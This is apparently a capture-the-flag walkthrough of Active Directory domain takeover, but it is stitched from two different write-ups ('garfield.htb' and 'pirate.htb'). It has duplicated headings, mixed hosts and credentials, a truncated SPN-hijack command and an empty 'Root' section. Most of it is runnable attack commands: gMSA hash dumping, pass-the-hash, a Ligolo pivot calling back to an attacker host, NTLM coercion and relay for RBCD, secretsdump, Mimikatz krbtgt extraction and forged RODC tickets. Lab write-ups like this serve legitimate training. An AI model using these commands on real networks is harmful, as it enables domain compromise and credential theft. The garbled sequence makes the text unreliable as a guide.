## Enumeration

Initial host discovery and service enumeration identified a standard domain controller surface:

```bash
IP="10.129.64.251" ; DOMAIN="garfield.htb" && \
  echo "$IP $DOMAIN DC01.garfield.htb DC01.GARFIELD DC01.GARFIELD.HTB" | sudo tee -a /etc/hosts

nmap -sC -sV -Pn -n -vv -oN $IP.txt $IP
```

Relevant ports included DNS, Kerberos, LDAP, SMB, and WinRM. `rdp-ntlm-info` and time checks showed a consistent clock skew between the scanner and the target, which later affected Kerberos-based actions until the local time was synchronized.

The provided credentials for `j.arbuckle` were validated and used to enumerate shares and users:

```bash
nxc smb $IP -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
nxc smb $IP -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --shares
nxc smb $IP -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --users
```

## Enumeration

The target credentials were provided up front:

```bash
nxc smb 10.129.62.0 -u pentest -p 'p3nt3st2025!&' --shares
nxc ldap 10.129.62.0 -u pentest -p 'p3nt3st2025!&' --users
nxc ldap 10.129.62.0 -u pentest -p 'p3nt3st2025!&' --groups | grep -i "pre-windows\|2000"
```

The target is the domain controller:

- `DC01`
- Domain: `pirate.htb`
- SMB signing: enabled on the DC
- LDAP signing: not enforced
- Pre-Windows 2000 Compatible Access includes computer objects

Early LDAP enumeration showed these users:

- `Administrator`
- `Guest`
- `krbtgt`
- `a.white_adm`
- `a.white`
- `pentest`
- `j.sparrow`

A direct LDAP query confirmed that computer accounts were members of the Pre-Windows 2000 Compatible Access group:

```bash
nxc ldap 10.129.62.0 -u pentest -p 'p3nt3st2025!&' --query \
  "(memberOf=CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=pirate,DC=htb)" "sAMAccountName"
```

The same result was confirmed with `ldapsearch` and exposed the machine accounts:

- `DC01$`
- `MS01$`
- `EXCH01$`

## Why Pre-Windows 2000 Access Matters

The weak directory permissions let us identify pre-created machine accounts and use NetExec’s `pre2k` module to recover their default passwords.

Time skew caused Kerberos issues, so the local clock was synchronized to the domain controller before continuing:

```bash
DC_TIME=$(curl -s --head http://10.129.62.0 | grep -i '^Date:' | sed 's/Date: //')
faketime "$DC_TIME" nxc ldap 10.129.62.0 -u pentest -p 'p3nt3st2025!&' -M pre2k
```

The module identified the predictable machine passwords:

- `MS01$` -> `ms01`
- `EXCH01$` -> `exch01`

## Get a TGT for the Machine Account

Export the ticket cache generated by the module:

```bash
export KRB5CCNAME=/home/alex/.nxc/modules/pre2k/ccache/ms01.ccache
```

Then query group managed service account passwords:

```bash
faketime "$DC_TIME" nxc ldap 10.129.62.0 -u ms01 --use-kcache --gmsa
```

This returned:

- `gMSA_ADCS_prod$`
- `gMSA_ADFS_prod$`

The important hash used later was:

- `gMSA_ADFS_prod$` -> `30e4066182bb2c81dcd950b2fbb16564`

## Pivot to the Internal Network

With the gMSA hash, access to the domain controller was possible via Evil-WinRM:

```bash
evil-winrm -i 10.129.62.0 -u 'gMSA_ADFS_prod$' -H '30e4066182bb2c81dcd950b2fbb16564'
```

Inside `DC01`, `ipconfig` revealed a second NIC:

- `192.168.100.1`

That meant the box was dual-homed and could route us into an internal subnet.

### Ligolo Setup

On Kali:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:11601
```

On `DC01`:

```bash
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```

Then in the Ligolo session:

```bash
session
start
```

The internal subnet became reachable after that pivot.

## NTLM Relay and RBCD

### Coercion Tool

```bash
pipx install git+https://github.com/p0dalirius/Coercer.git
```

### Relay Server

A stable Impacket release worked best, so a clean virtual environment was used:

```bash
python3 -m venv /tmp/imp
source /tmp/imp/bin/activate
pip install -U pip
pip install "impacket==0.13.1" ldap3
```

Then start `ntlmrelayx`:

```bash
impacket-ntlmrelayx \
  -t ldap://192.168.100.1 \
  --delegate-access \
  --escalate-user 'MS01$' \
  --remove-mic \
  -smb2support
```

### Trigger the Coercion

Use the gMSA hash from earlier:

```bash
coercer coerce \
  -u 'gMSA_ADFS_prod$' \
  -d pirate.htb \
  --hashes ':30e4066182bb2c81dcd950b2fbb16564' \
  -t 192.168.100.2 \
  -l 10.10.15.172 \
  --always-continue
```

### Result

The relay succeeded and `ntlmrelayx` configured RBCD on `WEB01$`:

- `MS01$` can now impersonate users on `WEB01$` via S4U2Proxy

That became the foothold for Kerberos impersonation.

> A shadow-credentials attempt was tested during troubleshooting, but it was not the correct path here. The working path was `--delegate-access` / RBCD.

## Secrets Dump on WEB01

First request a ticket for `MS01$`:

```bash
getTGT.py pirate.htb/'MS01$':'ms01' -dc-ip 192.168.100.1
export KRB5CCNAME=MS01\$.ccache
```

Then impersonate Administrator and ask for a CIFS ticket on `WEB01`:

```bash
getST.py pirate.htb/'MS01$':'ms01' \
  -spn cifs/WEB01.pirate.htb \
  -impersonate Administrator \
  -dc-ip 192.168.100.1 \
  -k -no-pass
```

Load the ticket and dump secrets from `WEB01`:

```bash
export KRB5CCNAME='Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache'
secretsdump.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb
```

The dump revealed:

- Local Administrator hash on `WEB01`
- `WEB01$` machine account hash
- Cached logons
- DPAPI material
- Most importantly, the plaintext password for `a.white`

The key line was:

```text
PIRATE\a.white:E2nvAOKSz5Xz2MJu
```

## SPN Hijack

The crucial move was to remove `HTTP/WEB01.pirate.htb` from `WEB01$` and add it to `DC01$`.

### Remove from WEB01

```bash
bloodyAD \
  -u 'a.white_adm' \
  -p 'P@ssw0rd123!' \
  -d pirate.htb \
  -H 10.129.62.0 \
  set object 'WEB01$' servicePrincipalName \
  -v 'HTTP/WEB01' \
  -v 'tapinego/WEB01' \
  -v 'tapinego/WEB01.pirate.htb' \
  -v 'WSMAN/WEB01' \
  -v 'WSMAN/WEB01.pirate.htb' \
  -v 'HOST/WEB01.pirate.htb' \
```

## Root on DC01

The hostname mattered for the SPN match. Use `DC01.pirate.htb` rather than the IP when consuming the ticket.


## Important Pitfalls

1. Time skew matters.

- `getTGT.py` initially failed with `KRB_AP_ERR_SKEW`
- Fix: synchronize time before requesting Kerberos tickets

2. SPN hijack must happen before requesting the final ticket.

- `HTTP/WEB01.pirate.htb` had to be removed from `WEB01$`
- Then it had to be added to `DC01$`

3. Use the hostname, not the IP, when consuming Kerberos tickets.

- `DC01.pirate.htb` worked
- Using the IP caused session issues

4. A stable Impacket build was important.

- The development build caused issues
- `impacket==0.13.1` in a clean venv worked consistently

5. NetExec was useful to validate the ticket.

- `nxc smb --kerberos --use-kcache` confirmed the cache before execution

## RODC Compromise

Re-running writable-object enumeration as `l.wilson_adm` showed direct control over the RODC computer object:

```bash
bloodyAD -d garfield.htb --host garfield.htb -u l.wilson_adm -p 'YourNewPass123!' get writable --detail
```

The important primitive was:

- `CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb`
- `msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE`

That gave a clean RBCD path onto `RODC01`.

The RODC lived on an isolated internal subnet, so a Ligolo pivot was used to reach it. After resolving `RODC01.garfield.htb` to the internal address and routing `192.168.100.0/24` through the tunnel, a fake computer account was created and delegated to the RODC:

```bash
impacket-addcomputer -computer-name 'PWNED$' -computer-pass 'Passw0rd123!' \
  -dc-host DC01.garfield.htb garfield.htb/l.wilson_adm:'YourNewPass123!'

impacket-rbcd -delegate-from 'PWNED$' -delegate-to 'RODC01$' -action write \
  -dc-ip 10.129.66.103 garfield.htb/l.wilson_adm:'YourNewPass123!'
```

Kerberos requests initially failed due to clock skew, so the local system time was synchronized before continuing.

With the RBCD trust in place, a service ticket was requested for `RODC01` and used to obtain SYSTEM access on the RODC.

## KeyList Attack

The intended finale on Garfield is the RODC KeyList chain. The `RODC Administrators` group plus the writable `scriptPath` on `krbtgt_8245` hinted that the box wanted an RODC cache abuse path rather than a straightforward full-domain Krbtgt compromise.

The sequence used was:

1. Join `RODC Administrators` as `l.wilson_adm`.
2. Extract the RODC's own krbtgt key with Mimikatz from the RODC.
3. Modify the RODC password-replication settings so `Administrator` could be revealed/cached.
4. Forge a ticket using the RODC krbtgt material.
5. Use that ticket to request a real service ticket from the domain controller.

The krbtgt key for the RODC was dumped with:

```text
lsadump::lsa /inject /name:krbtgt_8245
```

PowerView was then used to adjust `msDS-RevealOnDemandGroup` and clear `msDS-NeverRevealGroup` so the administrator account could be handled by the RODC.

With that in place, a forged ticket was created and exchanged for a valid service ticket against `DC01`. The resulting Kerberos ticket was then used externally from Kali to access the real domain controller and retrieve `root.txt` from the Administrator desktop.

## Final Attack Chain

```text
Writable scriptPath on domain users
-> SYSVOL logon-script hijack
-> l.wilson shell
-> ForceChangePassword on l.wilson_adm
-> RBCD on RODC01
-> SYSTEM on RODC01
-> RODC krbtgt material
-> RODC password replication abuse
-> forged RODC ticket
-> service ticket for DC01
-> Domain Admin
```
